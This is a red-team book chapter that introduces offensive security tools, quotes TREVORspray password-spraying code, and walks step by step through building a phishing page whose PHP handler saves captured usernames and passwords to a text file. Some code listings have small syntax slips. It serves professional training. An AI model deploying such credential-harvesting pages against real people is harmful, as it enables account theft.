TOOLS OF THE TRADECRAFT
The No Starch Press iron logo
As you embark on your Red Team Engineering journey, it is important to understand how an attacker thinks about software. Offensive security tasks require certain tools and trade-craft depending on the discipline. Some disciplines, such as vulnerability management or penetration testing, might have a lot of overlap in tools, particularly those for network and vulnerability scanning. Others require highly specialized or even completely custom tool kits specific to the tasks at hand. Such is the case with red teaming, which will be your primary focus as you set out to build your own tools in the next chapter.

Red teams are goal-oriented offensive security teams. This goal-oriented nature sets them apart from other disciplines—namely, penetration testing. Even if you’re newer to offensive security disciplines, you’ve likely heard about penetration testing and vulnerability management. If not, this will be a quick primer to showcase how different each discipline is from red teaming, while also showcasing how important the various types of tools are to each trade.

For starters, vulnerability management is simple in description but can be quite a bit more complex in practice. Regardless of the maturity of a given practice, vulnerability management offers the primary goal of identifying and reporting vulnerabilities to the organization and orchestrating their remediation with key stakeholders. In a less mature practice, this could look like simply running vulnerability scans on the external and internal networks and reporting those issues to system and network administrators. In a more mature practice, the complexity can spike in the sense that managing vulnerabilities can become a full asset- and inventory-tracking system that ingests data not only from vulnerability scans but also from findings reported to the organization by researchers, penetration testers, and red teams. Vulnerability scanning and asset monitoring are the only practical areas of the discipline that map to the other areas. In fact, a fatal flaw of relying on vulnerability scan data is that it is unverified. The vulnerabilities might be there, but sometimes scanners make mistakes, and even something as silly as the wrong version number in an oddly placed text file can yield a false-positive result. This is why a more mature practice would also integrate data from other testing methods that verify potential vulnerabilities, which brings us to penetration testing!

Penetration testing is the next step up from vulnerability scanning in terms of tooling. While penetration testers often use vulnerability scanners as part of their reconnaissance efforts, they don’t stop there. Penetration testers should be analyzing vulnerability scan data and then trying proof-of-concept exploits against those potentially impacted services to check that a vulnerability exists. By doing so, a penetration tester is able to demonstrate impact by showing that a weakness is not only discoverable but also actively exploitable from their given testing perspective. Depending on the context of the engagement, penetration testers may also need to work beyond a proof of concept to gain further access by utilizing an exploit they’ve identified. Skilled penetration testers will also fuzz and enumerate services that don’t have known exploits to see whether they can identify anything of use. Given enough time, a good penetration tester is bound to identify issues and vulnerabilities in services that the client may not have even known existed. These sorts of findings can consist of configuration issues, application vulnerabilities, or even something as simple as a weak password policy. To do all this exploitation, penetration testers either need to be able to write their own specialized tools or use existing tools beyond the scope of a standard vulnerability scan.

This need for more specialized tools, whether they’re custom or already existing, is an overlap that penetration testing shares with red teaming. In fact, a lot of the same exploitation tool kits, C2 frameworks, and password attack tools are used heavily by red teams and penetration testers alike. All these tools, regardless of the specific discipline, are known to the professional information security community as offensive security tools, or OSTs for short.

When it comes to OSTs, the main difference for red teaming centers around the goal-oriented nature of a red team operation. Three simple analogies put these differences in perspective:

A vulnerability scan is like surveying a landscape but not verifying the results; the scan gets you a general lay of the land and helps you find places to dig.
A penetration test is like taking what you identify from a survey and looking further into each potential area of interest to start digging. Sometimes a penetration test can dig deep, but often these engagements are time boxed, making getting vulnerability coverage (or identifying all the viable places to dig) far more important than seeing how deep you can go. In other words, a penetration test might find all the spots to look for gold, oil, fossils, or any other item a digging crew might be tasked to find, but it may not always dig deep enough to find those items.
A red team’s operation is more like picking a single spot to dig and trying to dig as deep as you can until you must stop or you find your target. Using the same analogy but focusing on finding gold, a red team may take interest in a spot that looks like it will reveal gold but ignore the spot related to oil. In the context of this analogy, the team would home in on that spot until it either finds gold or has to stop the dig. This approach ensures that if there’s something to find, it will be found, but at the expense of coverage. Red teams aren’t meant to find all the vulnerabilities; that’s what a penetration test is for. Instead, a red team is trying to make use of vulnerabilities they do identify to achieve a certain goal—in this case, find gold.
As you navigate each chapter, you will learn more about what it takes to perform a red team engagement as a whole. However, when it comes to OSTs, it is important to understand that although other tools are available, being able to develop your own (or at the very least modify existing tools) can be mission critical. This is especially true on a more advanced red team engagement.

One of the main benefits a red team can provide is simulating a specific adversary; a penetration test is not really designed to do this because of its focus on vulnerability coverage. This means a red team engagement could require simulation of a threat that may not be highly skilled and therefore would use OSTs that already exist (like the Metasploit framework, for example). On the other hand, a red team engagement could require simulating a nation-state-level threat actor using totally custom tools. Often these tools don’t exist publicly, but the tradecraft and techniques are known. A well-equipped red teamer should be able to investigate the tradecraft and techniques related to their operational requirements and craft their own software tool kits that utilize these attributes in order to simulate a threat actor’s potential capabilities against a given target.

With this in mind, it is critical for at least one member of the red team to be a skilled software developer, and all members must understand these aspects of tradecraft and techniques so they know what is going on when taking action on a given objective. If anyone on the team is not familiar with these concepts, operational integrity is at risk, as one could easily misunderstand or even disregard a particular technique and its order of operations by mistake. This may result in failure at achieving the goal.

Even though most of the work is on the developer here, anyone on a red team should be capable of some level of software development—which is hopefully why you are reading this book! Caveats apply for highly specialized red teams with dedicated roles related to social engineering, physical security, or certain types of OSINT, but if any of their specialties are related to computers and technology, those team members should be capable of writing OSTs. Now that you have a good understanding of why OSTs are so important, you will learn more about them and look at some examples before diving in to write your own.

OSTs are pieces of software with offensive hacking capabilities. As stated in the introduction, these tools come in all shapes and sizes. Take the tool TREVORspray, for example: Its complete software package is custom-built and tailored for password spraying. Since TREVORspray is open source, you can view its code and gain a clearer understanding of how common software libraries can be used to build more-focused tools. Of course, this is just like any other piece of software, but this time it is built to achieve the goals of offensive security-related operations.

At the top of the TREVORspray/trevorspray/lib/sprayers/adfs.py file, you can see which libraries this Python script is importing:

1 import logging
2 from bs4 import BeautifulSoup
3 from .base import BaseSprayModule
4 from ..util import is_domain, is_url
5 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
6
7 log = logging.getLogger("trevorspray.sprayer.adfs")
8
9
10 Class ADFS(BaseSprayModule):
11     userparm = "UserName"
12     passparam = "Password"
In lines 1 through 5, the script imports the logging, BeautifulSoup, and urllib.parse libraries, as well as other custom libraries for spraying specific algorithms and performing URL/domain checks. Everything else is built into Python’s installable package repositories. These are not inherently malicious packages, but TREVORspray either implements or wraps around them to achieve its nefarious goals. Here’s how the tool makes a request:

57 def create_request(self, username, password, proxythread):
58     request = super().create_request(username, password, proxythread)
59     parsed_url = urlparse(self.url)
60
61     # replace dummy username query parameter in the AuthURL
62     query = parse_qs(parsed_url.query, keep_blank_values=True)
63     if "username" in query:
64         query["username"] = [username]
65         parsed_url = parsed_url._replace(query=urlencode(query, doseq=True)
66         request.url = urlunparse(parsed_url
67         log.debug(f"Replaced username in URL, new URL: {request.url}")
68     request.headers["Referrer"] = request.url
69     request.headers["Origin"] = f"parsed_url.scheme://{parsed_url.netloc}"
70     return request
As you can see, TREVORspray uses the Python requests library to parse and create a new web request. Ultimately, TREVORspray will use this request to spray passwords against a target in an authentication attack—against an Active Directory Federation Services (ADFS) service, in this case—but the underlying structure is a simple Hypertext Transfer Protocol (HTTP) request.

This example is somewhat complex: The tool’s author has written custom software, from scratch, for a focused use case. However, even something as simple as creating a bash script that calls the netcat binary repeatedly to probe a target service works in the same way. The bash script in that scenario depends on netcat, much as the TREVORspray code depends on the Python requests library. The only difference is the layers of abstraction needed to achieve the tool’s goal.

The point here is that OSTs are normal software. Therefore, to create an OST, you have to know how to program. I expect you to understand basic programming, but my goal is to demonstrate how you can apply those fundamentals to ultimately build your own OSTs. If this sounds a little like I’ll be teaching you how to program with a focus on offensive security, that’s exactly right!

The skills you’ll learn in this book should make you a better hacker than you currently are, especially if you’ve never written your own tools before. Knowing how to program and build your own tools will set you apart in your career. Forget about malware for a moment and think about creating something like a vulnerability repository for reporting or a mind map to track attack paths. Are those tools OSTs, or are they just full-stack applications?

The answer is both! Because it’s all just software—and you’ll know how to write it by the end of this book.

I can’t overstate that these tools can be used for illegal and nefarious purposes. This book is intended as instructional material by a professional for other professionals, and using it for any other purpose is not condoned by me or my publisher. I hope and expect that you’ll apply the skills you learn here to an ethical, professional career in offensive security. This information is already public knowledge, just not common knowledge, and you should use it at your own risk. Be smart and safe in the way you use it.

As I’ve noted, this book is targeted to IT professionals. You should have a strong background in programming, computer networks, and general system administration before proceeding. Some fundamental material will be covered, but this book is not intended for a true beginner with no prior IT background.

PART I
OFFENSIVE SECURITY DEVELOPMENT
In this first part of the book, you will apply your software development skills in two ways. First, you’ll develop the very applications that you are going to target with the OSTs you create. You will start by building a simple client-side-only application to get an understanding of how attackers view the flow of web requests. It will eventually evolve into a full-stack application using a server-side language and database that you will use to explore authentication attacks.

Second, you’ll develop the OSTs themselves and use them to attack your custom applications as you go. Initially, your main focus will be using the application you develop as an OST in the form of a phishing page that can harvest credentials of unsuspecting users. This will equip you for developing custom phishing pages for real-world social engineering engagements on a red team. After this, you will shift focus to learning about password attacks such as brute-forcing and password spraying with one of the targets being your custom web application. Finally, you will move away from the application-specific attacks and dive into developing your own custom C2 services to help facilitate remote access to target systems. This not only will be incredibly helpful for real-world engagements where off-the-shelf tools are not an option but also will help you gain a deeper understanding of how these preexisting tools function so that you can potentially modify them yourself.

WEB APPLICATION EXPLOITS
The No Starch Press iron logo
In this chapter, you will build a custom web application that will initially be useful as a phishing website. Additionally, you will be introduced to some existing open source tool kits that are commonly used for credential-harvesting attacks. You will even use your code in tandem with these tools to achieve customized results. Not only is this code useful for credential-harvesting attacks like phishing, but you will also be able to reuse the applications you build as targets that you’ll later attack with tools you develop.

Web development is a broad skill set that encompasses many languages, frameworks, and components, which can make it a bit daunting to dive into. While many people can plod their way through simple HTML code, creating full applications that rely on server-side logic and database queries is vastly more complex. However, mastering web development allows offensive security professionals to build many tools.

In this chapter, we’ll focus on a few simple applications that achieve a common goal: credential harvesting. You’ll start by building a basic landing page using HTML, CSS, and JavaScript. This will be the starting point of the application you develop, and by the end you’ll have a variety of applications that utilize everything from JavaScript to PHP and a MySQL database to capture user credentials.

Considering OST Best Practices
Before we begin, it’s important to note that because these applications are built specifically for a credential-capturing use case, you won’t be following best practices when it comes to tasks like storing usernames and passwords. Normally, you would want to hash passwords and properly manage user sessions, but you’re intentionally not going to do that here. Keep in mind proper security controls as you’re developing OSTs in the future. More often than you might think, a developer will build an OST without considering its security implications.

Imagine the following scenario: Say you’re a hacker on a professional engagement, and you’ve dropped a web shell on a client’s web server after exploiting a vulnerability. Think about the ramifications for a moment. Yes, you gained access to execute code on your target, but now so can anyone else who visits the web page. This is very bad, as you’ve not only identified a vulnerability on your client’s system but also made it even more susceptible to compromise by exposing a nice, easy-to-use web shell on a public website. This problem has a simple fix, but if you’d just pulled an open source web shell off GitHub and don’t know at least a little basic web programming, you won’t know what to do.

The solution is to add a password to the web shell. The quickest way to do so is to add a query parameter that gets checked when the page loads. If that parameter contains a value that you specify, you load your web shell; if not, the page remains blank. This process is not complicated, but without basic web development skills, you’ll be leaving your client more vulnerable than they were before you cleaned up after the exploit.

Just because you’re attacking systems doesn’t mean it’s okay to forgo best practices or your own security. It would be extremely embarrassing, not to mention dangerous, if your own attacking infrastructure and tools were exploited, putting both you and your client at risk. Your tooling should always be far more secure than any client you are attacking. That said, it’s okay to take liberties where the context calls for it. For example, attack tools often need to run as root to have the permissions required to run certain code on your own system or even a target system. If that’s the case, and there’s truly no better way to lock down the permissions, then the best practice is to run as root. Similarly, storing credentials in plaintext is also perfectly valid if your goal is to capture plaintext credentials, as it is in this chapter. I’ll talk about best practices in more detail in Part II. Before you can do anything, though, you’ll need a frontend for your web application.

NOTE
The code you build out in this chapter will be reused in the next, so make sure to implement everything correctly if you’re following along, and you’ll save yourself a lot of time as you progress.

Building a Basic Phishing Page
To build a phishing website that can capture credentials, you first need to know how to build a basic landing page. All you need is a little bit of HTML, CSS, and JavaScript (skip ahead to Listing 1-1 to see the full code). You’ll want this landing page to look as realistic as possible, so you’ll use the Bootstrap framework for a modern-looking responsive design, the Font Awesome framework for convincing icons that add to the site’s aesthetic, and jQuery to handle those responsive design elements in real time.

The result is going to look like a simple white and gray website, with blue accents in the form of icons that look like a computer terminal. The site is not meant to look like anything in particular, and you are free to experiment with the design elements like the colors and icons to get comfortable making the code your own.

It’s worth noting that Bootstrap is not the only responsive design framework, and arguably not even the best. It is, however, extremely common at the time of this writing, and it’s very effective and simple to use compared to other frameworks. For the purpose of writing a convincing, modern-looking malicious website, Bootstrap provides more than enough structure.

Font Awesome is an optional font-based icon library that you’re using to put image-like elements on your web page without having to create those images. Of course, for a real-world application, you’ll likely want to take the time to locate or create logos that match your target goal and add those to your page instead.

Using Bootstrap and Font Awesome CSS for a Modern-Looking Site
Enter this code in a blank text file and save it as landing_page.html:

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name-"viewport" content="width=device-width, initial-scale=1.0">
        <title>Landing Page</title>

        <!-- Include Bootstrap CSS -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/
              bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/
              iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

        <!-- Include Font Awesome CSS -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/
              5.15.1/css/all.min.css">
    </head>
First, you define a few elements in the top of your file: the HTML document itself, some <meta> tags, and a title. The most important of these elements is the <title> tag, which is displayed in the user’s browser tab as well as indexed by search engines and displayed as a link in search results served to the end user. In this example, that title is simply Landing Page, but you’ll want to substitute that with something more realistic. This may seem like an insignificant detail, but to think like an attacker, you need to tighten every shoelace. If a user is trying to visit the Mega Corp website, seeing a Landing Page browser tab (because you copied and pasted this boilerplate code) could alert them that something is off.

Next, in the <head> tag at the top of the document, you define your style-sheet imports—in this case, for Bootstrap and Font Awesome. Bootstrap is a responsive design framework that works off a 12-column system, meaning you can divide your web page into 12 sections across. This ensures that as long as your content maintains this column structure, it will remain responsive and look good on any device or screen. Now, your design choices can affect your results (not everything looks great on every screen size), but Bootstrap sets you up for success by giving you the tools you need to work within the column system and build a page that looks good.

In this example, you’re importing the Bootstrap and Font Awesome CSS from a remote content delivery network (CDN). For the purposes of a proof of concept, importing from a CDN saves you a bit of time, since you don’t have to download the source files, add them to your project folder structure, and then reference their relative filepaths in the HTML code. Instead, you can just put in two lines, and you’re ready to go. Using a CDN has a downside, though: If your browser can’t communicate with the internet for some reason when displaying your website, the styles won’t load and your website will look like a garbled mess. If you’re hosting your site on the internet, this isn’t an issue; in fact, using a CDN in that instance can have a small performance benefit due to web caching.

If you’re hosting your site on an internal network, though, you’ll want to download the source files directly. That way, if you need to deploy a rogue web page on a client internal network and you have no other external network access, your web server will serve the CSS files and keep your website looking great. Keep that in mind based on your engagement needs.

Importing JavaScript Libraries via CDNs
You also need to import the JavaScript CDN so that your responsive design elements work later. You’ll be importing jQuery, Popper, and Bootstrap’s JavaScript library. Add the following code to the bottom of your current HTML document, just below the </head> tag:

<!-- Include Bootstrap JS, PopperJS, and jQuery -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js">
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</html>
With the <head> tag defined and the CDN imports configured, you’re ready to move on to the body of your landing page:

    <body>
        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center mt-5">
                    <i class="fas fa-terminal fa-5x text-primary*></i>
                    <h1 class="mt-3">Hello World</h1>
                </div>
            </div>
        </div>
    </body>
</html>
Insert a <body> tag below the </html> tag from the previous listing. Then, within it, define a <div> tag with a class of container (a reference to the built-in Bootstrap container class).

Inside the container class, you build out a new <div> tag as a row, followed by another <div> tag that contains Bootstrap column information. In the context of Bootstrap, you can picture the <div> tag as a box: All <div> tags are simply container objects that can be reshaped and moved based on the class type they are assigned. The row class establishes a row inside a container, and that row will contain columns; that is, the general structure flows from container to row to column. From here, you can divide your columns however you see fit in the 12-column system.

Next, to position a Font Awesome terminal icon, use the col-md-12 class and apply the text-center and mt-X classes. The mt-X class (where X is any number you specify) stands for margin-top. Bootstrap has abstracted these styling adjustments into their own classes so you can use them more cleanly in your HTML code instead of, for example, having to manually define a margin. In this case, mt-5 defines a top margin of 5 to provide five units of space between the top of the row and the icon’s place on the page.

Inside the column <div>, you can now place some of the landing page content. For this example, in addition to the Font Awesome terminal icon, you include a <h1> (Header 1) tag with text that reads Hello World. This icon and text will be displayed front and center on the landing page.

Much like Bootstrap, Font Awesome has built-in classes that can be used to style the icons. In this case, the first two classes, fas and fa-terminal, establish that the icon you’re creating is a Font Awesome icon, and it’s the terminal icon, respectively. The fa-5x class tells the browser to render the icon at five times the normal size. The text-primary class is actually a Bootstrap class that you use to set the color of the icon to be blue instead of the default black. The mt-3 class puts three units of space between the Hello World text and the icon above it so that the icon and header tag aren’t squished together in the container.

Put all these elements together and then open your page in a web browser. You should see the result shown in Figure 1-1.

Browser showing simple Hello World web page with terminal icon. Developer tools display HTML source code (left) and CSS properties (right) for website debugging.
Figure 1-1: Inspecting the custom landing page code via the browser developer controls

In your browser, right-click the page and select Inspect Element to view the Document Object Model (DOM). You can select HTML objects to learn more about them and how they’re being rendered with the styles you’ve defined. In Figure 1-1, for example, you can see how a row is defined by setting the CSS properties display, flex-wrap, margin-right, and margin-left to specific values. If you weren’t using Bootstrap and wanted to achieve the same effect, you’d have to write these values yourself—and that wouldn’t even account for the responsive design conditionals in the predefined Bootstrap CSS.

Adding a Navigation Bar
The landing page looks pretty good so far, but it’s just a centered terminal icon with some text. Now you’ll take your code a step further by adding a navigation bar to make the page look more like part of a real web application. To do this, define the following <nav> tag within the <body> tag above the <div> container:

    <nav class="navbar navbar-expand-lg navbar-light bg-light">
        <a class="navbar-brand" href="#">
            <i class="fas fa-code"></i>
        </a>
        <button class="navbar-toggler" type="button" data-toggle="collapse"
                data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false"
                aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
            <ul class="navbar-nav">
                <li class="nav-item">
                    <a class="nav-link" href="#">Home</a>
                </li>
            </ul>
        </div>
    </nav>
Navigation items in Bootstrap have a container structure similar to that of the <div> objects. The base item to define is the <nav> tag, which creates a blank bar that will contain all your navigation-specific items. In this case, you’re assigning the tag a few classes that instantiate the bar as a navbar and display it with a light theme. Inside the <nav> tag, you define an <a> (anchor) tag, which functions as an empty link, and assign it the navbar-brand class to place the branding on the left-hand side of the navigation bar. Other classes allow you to center or right-align your branding, but the default class sets it to the left. The anchor tag contains its own element, fa-code, another Font Awesome icon that will serve as a nice website logo for your navigation bar branding.

You could technically call the navigation bar complete at this point, but it is still missing one simple detail that most real-world websites have: actual pages to navigate to. Although you have only one page at this point, adding the code to host links to multiple pages will save you time if you want to extend the site in the future.

First, you add a button object. This may seem odd, since the button code doesn’t contain anything; it’s just a bunch of navbar-related Bootstrap classes and controls for data and Accessible Rich Internet Applications (ARIA, a set of attributes to enable assistive technologies). However, this button will become the collapsible menu if your site is loaded on a smaller screen, which is important if you also need to target mobile devices.

Second, you define the navigation item list. To accomplish this, create the <div> tag and define it as a collapsible navbar. Inside the <div>, define an unordered list, <ul>, which will contain the list item tag, <li>. This tells Bootstrap that whenever the device’s screen size is too small to fit the entire navbar normally, it should shove this list into the responsive button that you just defined. By default in HTML, <ul> tags display a bulleted list to the user, where each list item is preceded by a small, black, round bullet. In this case, you’re defining special <ul> and <li> objects that use the classes nav-item and nav-link, respectively. These tell Bootstrap that this list contains the navigation links, and to style them appropriately. The <li> is another simple anchor tag, which will be a link that does nothing. The link will display the text Home and, when clicked, will return the user to # (in most cases, this either returns the user to the top of the screen if they’re scrolling or does nothing if they’re already at the top).

With that code in place, your basic landing page is complete. Listing 1-1 shows the complete code.

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Landing Page</title>

        <!-- Include Bootstrap CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/
              4.5.2/css/bootstrap.min.css">

        <!-- Include Font Awesome CSS -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/
              5.15.1/css/all.min.css">
    </head>

    <body>
        <nav class="navbar navbar-expand-lg navbar-light bg-light">
            <a class="navbar-brand" href="#">
                <i class="fas fa-code"></i>
            </a>
            <button class="navbar-toggler" type="button" data-toggle="collapse"
                    data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false"
                    aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="#">Home</a>
                    </li>
                </ul>
            </div>
        </nav>

        <div class="container">
            <div class="row">
                <div class="col-md-12 text-center mt-5">
                    <i class="fas fa-terminal fa-5x text-primary"></i>
                    <h1 class="mt-3">Hello World</h1>
                </div>
            </div>
        </div>
    </body>

<!-- Include Bootstrap JS, PopperJS, and jQuery -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js">
</script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</html>

Save your landing page file and load the page in a browser. It should look like Figure 1-2. Just as before, you can inspect all the DOM elements.

Previous Hello World web page with new navbar. Developer tools open below display HTML code and CSS properties with focus on navbar button code.
Figure 1-2: Inspecting DOM elements for the completed landing page

Those navigation items are doing exactly what you expect them to. In the DOM, you can see that the button is initialized with some default values but invisible on the page. Try resizing the page while inspecting the button to see how the values dynamically change along with the menu’s appearance.

Even though your landing page is done, you still have more to do! For starters, you need a way to capture user credentials. To do that, you’ll build a login form.

Creating a Credential-Harvesting Form
You need a little more HTML to build your login form (to see the complete code, skip to Listing 1-2). Add the following code below the <div> container:

    <div class="row mt-5">
        <div class="col-md-6 offset-md-3">
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" class="form-control" id="username" name="username"
                           placeholder="Enter your username">
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" class="form-control" id="password"
                           name="password" placeholder="Enter your password">
                </div>
                <button type="submit" class="btn btn-primary">Log In</button>
            </form>
        </div>
    </div>
To create the form object, you define a <form> tag and give it the id value loginForm. This ID is critically important, since you want to be able to grab those credentials later. After that, you build out each field of the form. To make this look nice, use the form-group class from Bootstrap in a <div> tag, inside of which you place the form objects. The first object is a <label> tag that displays text to tell the user to type their username in this field.

Next is the <input> tag that creates the text field for the username. Two key values here are critical to your credential-capturing success: id and name. The ID value is important for the same reason as the loginForm ID value just defined: It will contain the user data you want to capture. You’ll be using this ID to select an input object in the JavaScript that you will write subsequently. Defining this value now will help you later because you’ll already have an ID reference to work with.

The name value is what a web server will see whenever it receives a POST request. This value allows you to capture the data sent in the POST request and store it however you like. You’ll also need to do this later when working with PHP. By defining the value now, you can use it later without having to make further changes.

Next you perform the same steps, but for the password <input> tag instead of the username. Everything about this code works exactly the same: You add a new form group <div> tag, inside of which is the password label and the password <input> tag.

As with the username input object, you must be sure to specify the id and name attributes so you can work with the data later. The main difference with this input object is that the type attribute is now set to password, so the input field will behave differently. When a user types in their password, the data will render as dots or asterisks to obscure the input. This doesn’t secure the data; this obfuscation simply helps protect users from everyday “shoulder surfing” attacks that result from prying eyes watching them type in their password. This is great, because you want users to feel secure as they’re typing their password into your nefarious web page, but since it does nothing to the actual data, you can still easily read the plaintext password later.

The last step is to make a submit button, labeled Log In, that the user will click after entering their credentials on your website. When clicked, this button will do whatever action you program it to do. In the example code, it’s styled as a simple Bootstrap button to keep the design cohesive, but functionally any button will work the same. Again, the only really important attribute to define is the type value, which in this case is submit. This tells the form that a submit action is taking place so it will handle itself accordingly. With some server-side language applications, as you’ll see later, this is important because the submit action will directly trigger the POST request you need. In the case of JavaScript, the submit attribute creates an event that you can intercept to process the action.

Handling Credentials with JavaScript
Now that you have your login form, you’re ready to capture data. You’ll use JavaScript to get the user’s credentials whenever they click Log In. For now, you’ll just print them in the browser’s JavaScript console to be sure your code is working successfully.

First, create a new file called js_data_capture.js that lives in the same directory as your HTML page. Then import the file as a script to be used by your HTML page by adding this line just above your other JavaScript imports:

<script src="js_data_capture.js"></script>
Now open your new JavaScript file and enter the following:

document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
         // Get the values from the form fields.
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;

         // Output the data to console.log for debugging.
         console.log('Username:', username);
         console.log('Password:', password);
});
This code does several things. First, it creates an event listener on your loginForm object by calling getElementById() and then constructing a function called addEventListener() to handle any events. Events in JavaScript come in many shapes and sizes, but you’ll be focusing on OnSubmit here. This built-in JavaScript event detects when a form has been submitted for a request. In this case, you want to know that the user has clicked Log In. The addEventListener() function takes the parameter e (short for event), meaning the JavaScript “event” object for the event listener is being passed in. Calling the preventDefault() method with this parameter prevents any default functionality from happening before your custom logic is executed. In this case, since there’s no server-side code and nowhere else for the data to go, the default event wouldn’t really do anything; however, calling this method is still good practice to ensure that your code will run exactly as intended.

Next, the document object selects the credentials that the user submitted and stores them in two constant variables: username and password. You then call console.log() to print the values stored in those variables to the web browser’s JavaScript console.

Your landing_page.html file should now look like Listing 1-2.

Capturing Credentials Server-Side with PHP
For now, you’re done with JavaScript. For the next chunk of code, you’ll be converting your form from static HTML into a robust PHP endpoint that can capture credentials, offload them into a file, and even store them in a database (skip to Listing 1-3 to see the complete server-side code). Be sure to remove this line from your HTML code before proceeding:

<script src="js_data_capture.js">/script>
Fortunately, you can easily convert your existing code to a PHP script. Simply place a PHP script block at the very top of the HTML file before all your HTML code, then resave the file as server_side_boilerplate.php:

<?php

// PHP code will go here.

?>
Now add the following between your PHP tags:

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
}
?>
The first line tells the PHP server how to handle the user data when it receives a POST request. Since you’re checking only for POST requests, the server will ignore requests of any other type. The next step is to capture the data. Much as you did in JavaScript, you’ll need to create two variables—username and password—to capture the user credentials. You could do this in a lot of ways, but this concise approach checks whether a value is in the $_POST object, and if not, safely sets it to an empty string.

Now it’s time to test. You want to make sure that you can serve this code on a PHP server and that your web page will still render correctly. Of course, you haven’t done anything with the username and password variables yet, but performing a quick sanity check will help you prepare your test environment and confirm that the code is functioning properly before you add more.

From a terminal, navigate to the directory containing your PHP file, and enter php -S localhost:8000 to create a simple PHP test server listening at http://localhost:8000. This makes your full test URL http://localhost:8000/server_side_boilerplate.php. Alternatively, if you have an Apache server configured, you can load your PHP file into /var/www/data/html and then go to http://localhost/server_side_boilerplate.php. Either way, when you visit the page, you should see that all the elements are rendering just as they did before.

NOTE
The test server should be enough for your local development (or for quick and dirty disposable deployments), but be sure to use a web server like the Apache HTTP Server or nginx for a real deployment.

Now when you submit test credentials, you’ll notice a couple of behaviors. The first is that your JavaScript console is now completely empty, which is expected since you removed the JavaScript import earlier. Second, absolutely no data is in the output log of your test PHP server, because you haven’t yet done anything with the data that would be displayed in this output log. But there’s an indication that a new request has been made to your server and this 404 response GET request to a favicon.ico file:

[404]: GET /favicon.ico – No such file or directory
This confirms that your form is indeed working: When it was submitted, the submission function successfully called your PHP code, and the page was essentially refreshed. This is great news, as it means that your PHP code has no errors so far, but there’s still much to do.

Next, you’ll use the echo command to print the values the user submitted. Add the following above the closing curly bracket of your current PHP code:

echo $username;
echo $password;
This will confirm not only that your form is submitting data but also that the data is being successfully captured and stored by the PHP variables you created.

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';

    echo $username;
    echo $password;
}

This is because echo literally prints the data you give it—no HTML styles, not even spaces. That’s no problem, though; for now, you’re just verifying that you can access those values. Now that you have, it’s time to store them somewhere.

Saving Credentials Without a Database
Now that you’ve done all that hard work, you’re just a few lines away from adding the functionality that transforms this simple script into a powerful phishing page.

Like most server-side scripting languages, PHP is capable of executing powerful file input/output (I/O) and operating system–level commands. You’ll use this to your advantage and create a file on your server that you can write any captured credentials to. (Skip to Listing 1-4 for the full server-side code that handles file writes.) Later, you’ll create a MySQL database to extend this functionality.

First, you’ll turn the username and password into a more readable string, as adminpassword123 isn’t easy to parse at a glance (and imagine if the user had a username/password combination of admin_user_user_admin_admin123). To make this more manageable, you’ll store these values in a new string that includes spacing and newlines. Replace your echo commands in server_side_boilerplate.php with the following:

// Create a string with the form data.
$formData = "Username: $username\nPassword: $password\n\n";
This new $formData string will display the final output in a format that looks more like this:

Username: $username
Password: $password
Obviously, this is far more legible than the previous format.

Now you can create the file to write the user credentials to. Add this below the $formData code you just wrote:

    // Specify the file to write the data to (change the path as needed).
    $filename = 'creds.txt';

    // Open the file for writing (create if it doesn't exist).
    $file = fopen($filename, 'a');

    if ($file) {
        // Write the form data to the file.
        fwrite($file, $formData);

        // Close the file.
        fclose($file);
    }
You start by defining a variable named $filename with the value creds.txt, a text file that will be stored on your server’s filesystem. Next, you call the fopen() function and pass it the parameter $filename with the value a (short for append). This will create the file creds.txt if it doesn’t already exist, and if creds.txt does exist, this will append data to the file instead of overwriting it. That way, if you capture more than one credential, each one is added to the creds.txt file instead of overwriting the previous one or creating a bunch of individual text files that you’d have to manually look through later.

Now, to confirm that the file creation was successful, you use an if conditional to check whether the new $file variable contains anything. If the fopen() function call succeeded, it should return a new PHP file object; otherwise, the $file variable will be empty. After verifying that the file exists on the filesystem, you call fwrite() and pass it two variables: $file, which contains the file object, and $formData, which contains the log string with the user’s credential data.

As with all file operations, the last step is to close it out, letting the system’s file handler know that you’re done working with this file and it’s available for someone else to access now. To do so, you call $fclose() and pass it your file object.

